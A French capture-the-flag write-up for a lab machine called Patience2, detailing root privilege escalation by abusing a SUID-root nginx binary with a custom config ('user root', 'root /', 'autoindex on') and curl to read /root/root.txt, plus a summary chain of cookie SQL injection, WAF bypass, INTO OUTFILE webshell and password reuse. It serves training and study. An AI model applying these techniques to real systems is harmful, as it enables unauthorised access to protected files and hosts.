# Patience2 — root.txt

## 1. Flag

```text
À récupérer
```

## 2. Objectif

L'objectif de cette étape est d'effectuer une **élévation de privilèges** depuis l'utilisateur `cookie-monster` jusqu'à `root`, afin de récupérer le fichier `root.txt`.

Le point d'entrée de l'escalade est une configuration dangereuse du binaire `/usr/sbin/nginx`, qui possède le bit **SUID root**.

---

## 3. Techniques utilisées

* Énumération des permissions SUID
* Analyse de binaires privilégiés
* Exploitation d'une mauvaise configuration SUID
* Création d'une configuration nginx personnalisée
* Abus du privilège `root` du processus nginx
* Exposition du système de fichiers via HTTP
* `autoindex`
* Lecture de fichiers privilégiés via HTTP

---

## 4. Outils utilisés

* `find`
* `ls`
* `nginx`
* `curl`
* Éditeur de texte
* Shell Linux

---

## 5. Énumération des fichiers SUID

Après avoir obtenu un shell avec l'utilisateur `cookie-monster`, une recherche des fichiers possédant le bit SUID est effectuée.

Plusieurs binaires standards sont identifiés, notamment :

```text
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
```

Un fichier particulièrement intéressant est cependant découvert :

```text
/usr/sbin/nginx
```

Ses permissions sont :

```text
rwsr-sr-x root root
```

Le `s` présent à la place du `x` pour le propriétaire indique que le bit **SUID** est activé.

Le binaire nginx est donc exécuté avec les privilèges du propriétaire :

```text
root
```

Cette configuration est anormale : un serveur web ne devrait normalement pas être installé avec le bit SUID root.

---

## 6. Création d'une configuration nginx malveillante

L'objectif est d'utiliser nginx comme serveur HTTP permettant de lire directement le système de fichiers.

Une configuration minimale est créée avec notamment :

```nginx
user root;

events {}

http {
    server {
        listen 4445;
        root /;

        autoindex on;
    }
}
```

Les éléments importants sont :

* `user root;` : force les workers nginx à rester sous l'identité `root`.
* `listen 4445;` : utilise un port libre.
* `root /;` : définit la racine HTTP sur `/`.
* `autoindex on;` : permet d'afficher le contenu des répertoires.

L'objectif est ainsi de transformer nginx en serveur de fichiers exécuté avec les privilèges `root`.

---

## 7. Premier essai

Un premier test est réalisé sans la directive :

```nginx
user root;
```

Le master nginx démarre bien avec les privilèges `root`, grâce au bit SUID.

Cependant, les workers qui traitent les requêtes HTTP abandonnent ces privilèges et s'exécutent avec l'utilisateur compilé par défaut :

```text
nobody
```

Une requête vers le répertoire `/root/` provoque donc un refus d'accès :

```text
403 Forbidden
```

Le master possède les privilèges root, mais le processus responsable de servir les fichiers n'en bénéficie pas.

---

## 8. Maintien des privilèges root

Pour empêcher nginx de changer d'utilisateur, la directive suivante est ajoutée à la configuration :

```nginx
user root;
```

La configuration permet alors aux workers nginx de rester sous l'identité :

```text
root
```

La situation devient :

```text
nginx SUID
    ↓
master root
    ↓
worker root
    ↓
HTTP
    ↓
lecture du système de fichiers
```

---

## 9. Démarrage du serveur nginx

Le binaire nginx SUID est lancé avec la configuration créée précédemment.

Le serveur écoute alors sur :

```text
4445
```

et expose comme racine HTTP :

```text
/
```

Grâce à :

```nginx
autoindex on;
```

les répertoires accessibles sont affichés sous forme de listings HTTP.

---

## 10. Accès au répertoire `/root`

Une requête HTTP est envoyée vers :

```text
http://10.10.0.26:4445/root/
```

Le serveur nginx répond avec le contenu du répertoire `/root/`.

La différence avec le premier essai est que le worker traite désormais la requête avec les privilèges `root`.

Il est donc possible d'accéder aux fichiers normalement protégés contre l'utilisateur `cookie-monster`.

---

## 11. Récupération de `root.txt`

Le fichier :

```text
/root/root.txt
```

est directement accessible via HTTP.

Une requête permet donc de récupérer son contenu :

```bash
curl http://10.10.0.26:4445/root/root.txt
```

Cette méthode permet d'obtenir le flag **sans obtenir de shell interactif root**.

L'escalade repose uniquement sur la capacité du processus nginx privilégié à lire le système de fichiers.

---

## 12. Vulnérabilité identifiée

### 12.1 Nginx configuré avec le bit SUID

Le problème principal est la présence du bit SUID sur :

```text
/usr/sbin/nginx
```

avec les permissions :

```text
rwsr-sr-x root root
```

Un utilisateur non privilégié peut ainsi lancer nginx avec les privilèges du propriétaire du binaire.

### 12.2 Conservation des privilèges dans les workers

La directive :

```nginx
user root;
```

empêche nginx d'abandonner les privilèges root pour ses workers.

Cela transforme le serveur HTTP en processus capable de lire des fichiers protégés.

### 12.3 Exposition de `/`

La configuration :

```nginx
root /;
autoindex on;
```

expose l'ensemble du système de fichiers via HTTP.

La combinaison des trois éléments permet finalement de lire `/root/root.txt`.

---

## 13. Chaîne d'exploitation complète

Le challenge **Patience (insane)** peut être résumé par la chaîne suivante :

```text
SQL Injection sur le cookie id
        ↓
Bypass du WAF par variation de casse
        ↓
Privilège MySQL FILE
        ↓
LOAD_FILE()
        ↓
Lecture de /etc/passwd
        ↓
Découverte de cookie-monster
        ↓
INTO OUTFILE
        ↓
Webshell PHP
        ↓
RCE www-data
        ↓
Lecture de cookie_analysis
        ↓
Récupération du mot de passe
        ↓
su cookie-monster
        ↓
user.txt
        ↓
Énumération des SUID
        ↓
/usr/sbin/nginx (SUID root)
        ↓
Configuration nginx personnalisée
        ↓
root /
        ↓
autoindex on
        ↓
user root
        ↓
nginx worker root
        ↓
HTTP /root/
        ↓
/root/root.txt
```

---

## 14. Résumé

L'escalade de privilèges de **Patience2** repose sur une mauvaise configuration critique du binaire nginx.

Le binaire :

```text
/usr/sbin/nginx
```

possède le bit SUID et appartient à `root` :

```text
rwsr-sr-x root root
```

Il est donc possible de lancer nginx avec des privilèges élevés.

Un premier essai montre cependant que les workers nginx repassent sous l'utilisateur `nobody`. L'ajout de :

```nginx
user root;
```

permet de conserver les privilèges root.

En configurant ensuite nginx avec :

```nginx
root /;
autoindex on;
```

le système de fichiers entier devient accessible via HTTP.

Le fichier :

```text
/root/root.txt
```

peut alors être lu directement avec `curl`, sans avoir besoin d'obtenir un shell interactif root.

La chaîne finale est donc :

```text
cookie-monster
    ↓
SUID nginx
    ↓
nginx worker root
    ↓
lecture HTTP de /
    ↓
/root/root.txt
```
